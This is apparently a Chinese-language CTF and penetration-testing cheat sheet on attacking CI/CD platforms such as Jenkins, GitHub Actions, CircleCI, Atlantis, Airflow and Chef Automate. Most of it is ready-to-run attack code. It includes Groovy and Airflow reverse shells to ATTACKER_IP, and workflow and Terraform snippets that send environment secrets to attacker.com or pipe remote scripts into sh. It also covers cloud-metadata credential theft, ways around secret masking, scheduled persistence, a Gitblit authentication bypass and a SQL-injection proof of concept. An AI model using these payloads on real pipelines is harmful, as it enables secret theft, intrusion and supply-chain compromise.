---
category: cloud
tags: [cicd, ci/cd, jenkins, github actions, gitlab ci, gitea, circleci, travisci, concourse, atlantis, ansible, awx, airflow, chef, pipeline, 持续集成, 持续部署, 流水线, 供应链攻击, supply chain, runner, agent, groovy, terraform, webhook, secret exfiltration]
triggers: [jenkins, script console, groovy, pipeline, github actions, gitlab ci, gitea, .github/workflows, circleci, travisci, concourse, atlantis, terraform plan, ansible tower, awx, airflow, chef automate, ci/cd, cicd, runner, self-hosted runner, build, deploy, webhook, secret, credential, pipeline injection, supply chain, 持续集成, 持续部署, 流水线注入, 构建脚本, 环境变量注入]
related: [cloud/kubernetes_enum, cloud/container_escape, cloud/aws_iam_enum]
---

# CI/CD 攻击综合速查

## 什么时候用

题目中出现了 `Jenkins`、`GitHub Actions`、`GitLab CI`、`Gitea`、`.github/workflows`、`Jenkinsfile`、`Groovy`、`pipeline`、`CircleCI`、`Travis`、`Concourse`、`Atlantis`、`terraform`、`Ansible Tower`/`AWX`、`Airflow`、`Chef`、`webhook`、`runner`、`build` 等线索时，应考虑 CI/CD 攻击面。

CI/CD 系统是高价值目标：它们持有代码仓库凭证、云 Provider 密钥、部署 Token，并且通常以高权限执行任意代码。在 CTF/渗透中，拿下 CI/CD = 拿下整个软件供应链。

## 前提条件

- 发现了 CI/CD 服务的 Web 界面、API 端点或 Webhook URL
- 拥有某种程度的仓库写权限（可修改构建配置文件），或发现了未授权访问
- 知道目标使用的 CI/CD 平台类型（通过端口扫描、路径探测、配置文件等判断）

## 攻击步骤

---

### 一、Jenkins

#### 1.1 识别与未授权访问

Jenkins 默认端口 8080/8443。关键路径：

```
/script          — Groovy Script Console（最高价值目标）
/manage          — 管理页面
/configureSecurity — 安全配置
/credentials/    — 凭证管理
/asynchPeople/   — 用户枚举
/view/all/newJob — 创建新 Job
```

Jenkins 有多种授权模式，其中 **Anyone can do anything** 和 **Logged-in users can do anything** 是最容易利用的。检查 `/configureSecurity` 确认。

#### 1.2 Script Console RCE

如果能访问 `/script`，可以直接执行 Groovy 代码获取 RCE：

```groovy
// 执行系统命令
def cmd = "id && cat /etc/passwd".execute()
println cmd.text

// 反弹 Shell
def proc = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()
```

#### 1.3 Pipeline RCE（创建/修改 Pipeline）

在 `/view/all/newJob` 创建 Pipeline 类型 Job，注入 Groovy 脚本：

```groovy
pipeline {
    agent any
    stages {
        stage('RCE') {
            steps {
                sh '''
                    curl https://reverse-shell.sh/ATTACKER:PORT | sh
                '''
            }
        }
    }
}
```

保存后点击 **Build Now** 即可执行。如果能修改已有 Pipeline 的配置，直接追加反弹 shell 步骤。

#### 1.4 凭证提取

Jenkins 凭证用 AES-CBC 加密，密钥链：`master.key` → `hudson.util.Secret` → 解密凭证。

```bash
# 定位关键文件
ls -la $JENKINS_HOME/secrets/master.key
ls -la $JENKINS_HOME/secrets/hudson.util.Secret
cat $JENKINS_HOME/credentials.xml

# 搜索所有插件/Job 配置中的明文密码
grep -rn "password\|token\|SecretKey\|credentialId" $JENKINS_HOME/*.xml
find $JENKINS_HOME/jobs -maxdepth 2 -name config.xml \
  -exec grep -lH "password\|token\|SecretKey" {} \;
```

获取 `master.key` + `hudson.util.Secret` + `credentials.xml` 后，用 [jenkins-credentials-decryptor](https://github.com/hoto/jenkins-credentials-decryptor) 解密：

```bash
jenkins-credentials-decryptor \
  -m master.key -s hudson.util.Secret -c credentials.xml
```

在 Pipeline 中通过 base64 绕过日志遮蔽来窃取凭证：

```groovy
withCredentials([string(credentialsId: 'secret-id', variable: 'SECRET')]) {
    sh 'echo $SECRET | base64'
}
```

#### 1.5 认证方式与攻击向量

| 认证方式 | 利用思路 |
|---------|---------|
| 用户名+密码 | 弱口令、默认口令（admin/admin） |
| JSESSIONID Cookie | 窃取后劫持会话 |
| API Token | 用户自生成，可用于 CLI/REST API |
| SSH Key | 内置 SSH 服务，可用 SSH 客户端执行 CLI |

---

### 二、GitHub / GitLab / Gitea

#### 2.1 GitHub Actions Secret 窃取

只要拥有仓库写权限，就能修改 `.github/workflows/*.yml` 来窃取 Secrets：

```yaml
name: Exfil
on: push
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Exfil secrets
        run: |
          curl https://attacker.com/?s=$(env | base64 -w0)
        env:
          SECRET1: ${{ secrets.AWS_ACCESS_KEY }}
          SECRET2: ${{ secrets.DEPLOY_TOKEN }}
```

**Environment Secrets** 需要在 workflow 中声明 `environment: env_name` 才能访问。如果 Environment 配置了 Required Reviewers，需要额外绕过。

#### 2.2 Self-Hosted Runner 逃逸

搜索 `runs-on: self-hosted` 定位使用自托管 Runner 的仓库。如果 Runner 运行在云环境（AWS/GCP）：

```bash
# AWS 元数据
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP 元数据
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Runner 本身可能存储了其他仓库的构建缓存、环境变量、Docker 镜像等。

#### 2.3 GitHub 已删除数据恢复

即使仓库或 Fork 被删除，commit 数据仍可通过 commit hash 访问：

```
https://github.com/<user>/<repo>/commit/<full_sha1>
https://github.com/<user>/<repo>/commit/<short_sha1>   # 7 字符可暴力枚举
```

三种泄露场景：
- Fork 提交后删除 Fork → commit 仍存活在原仓库网络中
- 原仓库删除 → commit 通过 Fork 仍可访问
- 私有仓库 Fork 后公开原仓库 → Fork 期间的私有 commit 可通过公开仓库访问

#### 2.4 Gitea 特殊攻击面

- PAT 和 OAuth Token 默认拥有账户**完整权限**（无 scope 限制）
- Deploy Key 可能有写权限
- 分支保护不能在组织级别设置，容易遗漏

#### 2.5 Gitblit SSH 认证绕过（CVE-2024-28080）

Gitblit < 1.10.0 的嵌入式 SSH 存在认证绕过。只要知道用户名和一个公钥（如 `https://github.com/<user>.keys`），即可无需私钥认证：

```bash
# ~/.ssh/config — 只配置公钥文件（无私钥）
Host gitblit-target
  HostName <target>
  User <victim>
  PubkeyAuthentication yes
  PreferredAuthentications publickey,password
  IdentitiesOnly yes
  IdentityFile ~/.ssh/victim.pub   # 只有公钥

# 连接时密码随意输入即可认证成功
ssh gitblit-target
```

原理：公钥认证第一阶段（key acceptable）错误地将 UserModel 绑定到 session，密码认证信任了这个状态。

---

### 三、CircleCI / TravisCI / Concourse

#### 3.1 CircleCI Secret 窃取

只需仓库写权限即可窃取所有 Project Secret 和 Context Secret：

```yaml
# .circleci/config.yml
version: 2.1
jobs:
  exfil:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "Exfil"
          command: |
            curl https://attacker.com/?d=$(env | base64 -w0)
workflows:
  exfil-wf:
    jobs:
      - exfil:
          context: Target-Context    # 指定 Context 名称
```

**Import Variables** 功能可以从其他项目导入变量，攻击者可以先导入再窃取。

定时触发持久化：

```yaml
workflows:
  exfil-cron:
    triggers:
      - schedule:
          cron: "0 */6 * * *"
          filters:
            branches:
              only: [main]
    jobs:
      - exfil:
          context: Target-Context
```

#### 3.2 CircleCI 云逃逸

如果构建运行在受害者自己的机器上，可以访问云元数据端点。使用 `machine` executor 替代 Docker：

```yaml
jobs:
  escape:
    machine:
      image: ubuntu-2004:current
    steps:
      - run: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### 3.3 TravisCI

- 每个仓库有独立 RSA 密钥对，可加密 Secret 到 `.travis.yml`
- `travis pubkey -r <owner>/<repo>` 获取仓库公钥
- Enterprise 版本使用 PostgreSQL + K8s + RabbitMQ，可能存在额外攻击面

#### 3.4 Concourse CI

架构组件：ATC（Web + Scheduler）+ TSA（SSH 注册，端口 2222）+ Worker（Garden 7777 + Baggageclaim 7788）。

```yaml
# 利用 Pipeline 任务读取 K8s Secret
jobs:
  - name: steal-secret
    plan:
      - task: exfil
        privileged: true
        config:
          platform: linux
          image_resource:
            type: registry-image
            source: { repository: busybox }
          run:
            path: sh
            args: [-cx, 'echo "$SECRET_VAR"']
          params:
            SECRET_VAR: ((secret-name.key))
```

`fly intercept` 可以直接进入运行中的任务容器。

---

### 四、IaC 与自动化平台

#### 4.1 Atlantis（Terraform CI/CD）

Atlantis 在 PR 上执行 `terraform plan/apply`。如果有仓库写权限：

**plan 阶段 RCE**（external data source）：

```hcl
data "external" "rce" {
  program = ["sh", "-c", "curl https://attacker.com/shell.sh | sh"]
}
```

**apply 阶段 RCE**（local-exec provisioner）：

```hcl
resource "null_resource" "rce" {
  provisioner "local-exec" {
    command = "curl https://attacker.com?k=$AWS_ACCESS_KEY&s=$AWS_SECRET_KEY"
  }
}
```

**自定义 Workflow RCE**（需要 `allow_custom_workflows=true`）：

```yaml
# atlantis.yaml
version: 3
projects:
  - dir: .
    workflow: rce
workflows:
  rce:
    plan:
      steps:
        - run: "curl https://attacker.com/shell.sh | sh"
```

后渗透关键文件：

```
/home/atlantis/.git-credentials     — VCS 凭证
/atlantis-data/atlantis.db          — 数据库（含凭证）
/proc/1/environ                     — 环境变量（云凭证）
```

默认 Web 界面（端口 4141）无认证，或 `atlantis:atlantis`。

#### 4.2 Ansible Tower / AWX

- 默认 API 端口 443，凭证存储在 PostgreSQL 中
- **System Administrator** 角色拥有完全控制权
- Job Template 可以访问已配置的 Credentials（SSH Key、云 Token 等）
- 利用 **AnsibleHound** 枚举权限图谱，类似 BloodHound 分析 AD

```bash
# AnsibleHound 收集 AWX 权限数据
ansiblehound collect --url https://awx.target.com --token <api-token>
```

攻击路径：获取低权限 Token → 枚举可执行的 Job Template → 通过 Template 获取高权限 Credential → 横向移动到云/基础设施。

#### 4.3 Apache Airflow

关键配置文件 `airflow.cfg`，高价值配置项：

| 配置项 | 攻击价值 |
|-------|---------|
| `[webserver] secret_key` | Flask Session 签名密钥，可伪造任意用户 |
| `[webserver] expose_config` | 如果为 True，可通过 Web 读取完整配置 |
| `[core] fernet_key` | 对称加密密钥，解密 Airflow Variables/Connections |
| `[api] auth_backend` | 如果设为 `default`，API 无认证 |
| `[celery] result_backend` | 可能泄露 PostgreSQL 凭证 |
| `AUTH_ROLE_PUBLIC = 'Admin'` | 匿名用户直接获得 Admin 权限 |

Airflow DAG 本质上是 Python 代码，如果能上传/修改 DAG 文件：

```python
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

dag = DAG('rce', start_date=datetime(2024, 1, 1), schedule_interval='@once')
BashOperator(
    task_id='shell',
    bash_command='bash -i >& /dev/tcp/ATTACKER/4444 0>&1',
    dag=dag
)
```

#### 4.4 Chef Automate

- API 使用 gRPC-Gateway 桥接 REST → gRPC
- `x-data-collector-token` 头用于认证，可能存在默认 Token
- **CVE-2025-8868**：`/api/v0/compliance/profiles/search` 的 `filters[].type` 字段存在时间盲注

```bash
# 时间盲注 PoC
curl -X POST https://target/api/v0/compliance/profiles/search \
  -H "Content-Type: application/json" \
  -H "x-data-collector-token: <token>" \
  -d '{"filters":[{"type":"name'\''||(SELECT pg_sleep(5))||'\''","values":["test"]}]}'
```

---

### 五、通用 CI/CD 攻击模式

#### 5.1 环境变量 / Secret 窃取通用手法

CI/CD 平台通常会遮蔽 Secret 输出，base64 编码是通用绕过：

```bash
env | base64 | curl -X POST -d @- https://attacker.com/collect
# 或拆分输出
env | xxd -p | fold -w 60 | while read line; do
  curl "https://attacker.com/$line"; done
```

#### 5.2 构建脚本注入

适用于任何在 PR/Push 时自动执行构建的 CI/CD 系统：

1. Fork 或创建分支
2. 修改构建配置文件（`Jenkinsfile`、`.github/workflows/*.yml`、`.circleci/config.yml`、`.gitlab-ci.yml` 等）
3. 注入恶意命令
4. 提交 PR 触发构建

#### 5.3 Webhook 伪造

如果 Webhook Secret 泄露或未配置，可以直接调用 CI/CD 的 Webhook 端点触发构建。Bitbucket Cloud 不支持 Webhook Secret。

#### 5.4 Runner / Agent 逃逸

- Docker-in-Docker：挂载了 Docker Socket 的 Runner 可以逃逸到宿主机
- 特权容器：`privileged: true` 配置允许挂载宿主文件系统
- 云 metadata：自托管 Runner 在云上运行时可访问 Instance 元数据获取凭证

#### 5.5 供应链投毒

- 恶意 GitHub Action / GitLab CI Template / CircleCI Orb
- 依赖混淆（Dependency Confusion）
- Typosquatting（包名拼写变体）
- 构建缓存投毒

#### 5.6 Cloudflare Workers 代理（IP 轮换）

在渗透测试中可利用 Cloudflare Workers 作为透明代理，实现类似 FireProx 的 IP 轮换：

```javascript
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})
async function handleRequest(request) {
  const url = new URL(request.url)
  const target = url.searchParams.get('url')
  if (!target) return new Response('Missing ?url=', {status: 400})
  const resp = await fetch(target, {
    method: request.method,
    headers: request.headers,
    body: ['GET','HEAD'].includes(request.method) ? null : request.body
  })
  return new Response(resp.body, { status: resp.status })
}
```

配合 [FlareProx](https://github.com/MrTurvey/flareprox) 可批量部署 Worker 实现自动轮换。

## 常见坑

- **Secrets 遮蔽不等于安全**：CI/CD 平台只在日志中遮蔽，base64/hex 编码即可绕过
- **分支保护不阻止 plan**：Atlantis 的 `terraform plan` 在 PR 创建时就执行，apply 才需要合并
- **Context vs Project Secret**：CircleCI 的 Context Secret 默认对组织内所有仓库可见
- **Fork PR 也能触发 Action**：GitHub Actions 的 `pull_request_target` 事件在目标仓库上下文中运行，可能泄露 Secret
- **Jenkins 插件配置也存密码**：不仅是 `credentials.xml`，`$JENKINS_HOME/*.xml` 和 Job 的 `config.xml` 也可能有明文密码
- **`Principal: "*"` 不等于公网可达**：CI/CD 中的 IAM 策略同样适用这个规则
- **删除 ≠ 消失**：GitHub 上删除的 Fork/Repo/Commit 仍可通过 SHA-1 访问

## 变体

- **Jenkins**：Script Console RCE / Pipeline Groovy 注入 / 凭证解密 / 未授权 API
- **GitHub Actions**：Workflow 注入 / Self-hosted Runner 逃逸 / `GITHUB_TOKEN` 滥用 / `pull_request_target` 攻击
- **GitLab CI**：`.gitlab-ci.yml` 注入 / Runner Token 窃取 / 共享 Runner 攻击
- **CircleCI**：Context Secret 窃取 / Import Variables 跨项目导入 / Cloud 元数据访问
- **Atlantis**：`terraform plan` RCE / `terraform apply` RCE / 自定义 Workflow / Webhook Secret 伪造
- **Ansible/AWX**：Job Template 凭证访问 / Playbook 注入 / 权限图谱枚举
- **Airflow**：DAG Python 代码注入 / Flask Secret Key 伪造会话 / Fernet Key 解密
- **Chef Automate**：SQL 注入（CVE-2025-8868）/ 默认 Data Collector Token
- **Concourse**：Pipeline 任务 Secret 读取 / `fly intercept` 容器逃逸 / Garden API 未认证
- **Gitblit**：SSH 认证绕过（CVE-2024-28080）

## 相关技术

- [[cloud/kubernetes_enum]] — CI/CD Runner 常部署在 K8s 中，Runner Pod 可能有过宽的 RBAC 权限
- [[cloud/container_escape]] — 特权构建容器、Docker-in-Docker 场景下的逃逸
- [[cloud/aws_iam_enum]] — CI/CD 系统持有的 AWS 凭证是横向移动的关键入口
